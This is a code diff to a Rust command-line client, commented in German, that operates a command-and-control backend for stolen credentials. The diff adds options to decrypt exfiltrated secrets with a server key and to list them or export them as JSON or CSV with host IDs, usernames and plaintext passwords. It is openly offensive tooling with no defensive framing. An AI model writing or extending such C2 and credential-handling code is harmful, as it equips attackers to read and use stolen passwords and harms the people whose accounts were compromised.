@@ -4,6 +4,7 @@
 //! erbeuteten Credentials. Kommuniziert über TLS mit dem C2-Backend.
 
 mod client;
+mod decrypt;
 
 use std::path::PathBuf;
 
@@ -36,6 +37,14 @@ enum Command {
         /// Optionaler Filter nach Benutzername (Teilstring).
         #[arg(long)]
         user: Option<String>,
+        /// Die Secrets mit dem geheimen Server-Schluessel entschluesseln.
+        ///
+        /// Ohne diese Option bleibt das Passwort verschluesselt.
+        #[arg(long)]
+        decrypt: bool,
+        /// Pfad zum geheimen Server-Schluessel (JSON) — noetig fuer --decrypt.
+        #[arg(long)]
+        server_key: Option<PathBuf>,
     },
     /// Secrets in eine Datei exportieren (JSON oder CSV).
     Export {
@@ -44,6 +53,12 @@ enum Command {
         /// Format: json oder csv.
         #[arg(long, default_value = "json")]
         format: String,
+        /// Die Secrets vor dem Export entschluesseln.
+        #[arg(long)]
+        decrypt: bool,
+        /// Pfad zum geheimen Server-Schluessel (JSON) — noetig fuer --decrypt.
+        #[arg(long)]
+        server_key: Option<PathBuf>,
     },
     /// Alle Tasks auflisten.
     Tasks,
@@ -88,18 +103,38 @@ async fn main() {
                 std::process::exit(1);
             }
         },
-        Command::Secrets { user } => match c.secrets().await {
+        Command::Secrets {
+            user,
+            decrypt,
+            server_key,
+        } => match c.secrets().await {
             Ok(secrets) => {
                 let filtered: Vec<_> = secrets
                     .iter()
                     .filter(|s| user.as_deref().map_or(true, |u| s.username.contains(u)))
                     .collect();
                 info!("{} Secrets gefunden", filtered.len());
-                for s in &filtered {
-                    println!(
-                        "{:<20} {:<30} {:<15} {}",
-                        s.cred_type, s.username, s.source, s.collected_at
-                    );
+                if *decrypt {
+                    let eigen: Vec<_> = filtered.iter().map(|s| (*s).clone()).collect();
+                    let entschluesselt = entschluesseln(&c, server_key.as_deref(), &eigen).await;
+                    for s in &entschluesselt {
+                        println!(
+                            "{:<20} {:<20} {:<30} {:<15} {}",
+                            s.host_id, s.cred_type, s.username, s.source, s.password
+                        );
+                    }
+                } else {
+                    for s in &filtered {
+                        let passwort = if s.password.is_empty() {
+                            "<verschluesselt>".to_string()
+                        } else {
+                            s.password.clone()
+                        };
+                        println!(
+                            "{:<20} {:<20} {:<30} {:<15} {}",
+                            s.host_id, s.cred_type, s.username, s.source, passwort
+                        );
+                    }
                 }
             }
             Err(e) => {
@@ -107,18 +142,47 @@ async fn main() {
                 std::process::exit(1);
             }
         },
-        Command::Export { path, format } => match c.secrets().await {
-            Ok(secrets) => match client::export(&secrets, path, format) {
-                Ok(()) => info!(
-                    "{} Secrets nach {} exportiert",
-                    secrets.len(),
-                    path.display()
-                ),
-                Err(e) => {
-                    error!("Export fehlgeschlagen: {e}");
-                    std::process::exit(1);
+        Command::Export {
+            path,
+            format,
+            decrypt,
+            server_key,
+        } => match c.secrets().await {
+            Ok(secrets) => {
+                let zu_exportieren: Vec<kx_core::c2::ExfiltratedSecret> = if *decrypt {
+                    entschluesseln(&c, server_key.as_deref(), &secrets)
+                        .await
+                        .into_iter()
+                        .map(|k| {
+                            let wert = k.password.clone();
+                            kx_core::c2::ExfiltratedSecret {
+                                id: String::new(),
+                                host_id: k.host_id,
+                                cred_type: k.cred_type,
+                                username: k.username,
+                                password: String::new(),
+                                source: k.source,
+                                collected_at: String::new(),
+                                sealed_password: String::new(),
+                            }
+                            .mit_passwort(&wert)
+                        })
+                        .collect()
+                } else {
+                    secrets.clone()
+                };
+                match client::export(&zu_exportieren, path, format) {
+                    Ok(()) => info!(
+                        "{} Secrets nach {} exportiert",
+                        zu_exportieren.len(),
+                        path.display()
+                    ),
+                    Err(e) => {
+                        error!("Export fehlgeschlagen: {e}");
+                        std::process::exit(1);
+                    }
                 }
-            },
+            }
             Err(e) => {
                 error!("Secret-Abfrage fehlgeschlagen: {e}");
                 std::process::exit(1);
@@ -150,4 +214,37 @@ async fn main() {
             }
         }
     }
+}
+
+/// Entschluesselt die Secrets mit dem geheimen Server-Schluessel.
+///
+/// Ohne Schluesseldatei bricht das ab — ohne den Schluessel lassen sich die
+/// Passwoerter nicht lesen.
+async fn entschluesseln(
+    client: &client::Client,
+    server_key: Option<&std::path::Path>,
+    secrets: &[kx_core::c2::ExfiltratedSecret],
+) -> Vec<decrypt::Klartext> {
+    let pfad = match server_key {
+        Some(p) => p,
+        None => {
+            error!("--decrypt braucht --server-key <datei>");
+            std::process::exit(1);
+        }
+    };
+    let entschluesseler = match decrypt::Decryptor::load(pfad) {
+        Ok(d) => d,
+        Err(e) => {
+            error!("Server-Schluessel unbrauchbar: {e}");
+            std::process::exit(1);
+        }
+    };
+    let hosts = match client.hosts().await {
+        Ok(h) => h,
+        Err(e) => {
+            error!("Host-Abfrage fehlgeschlagen: {e}");
+            std::process::exit(1);
+        }
+    };
+    entschluesseler.decrypt_all(&hosts, secrets)
 }
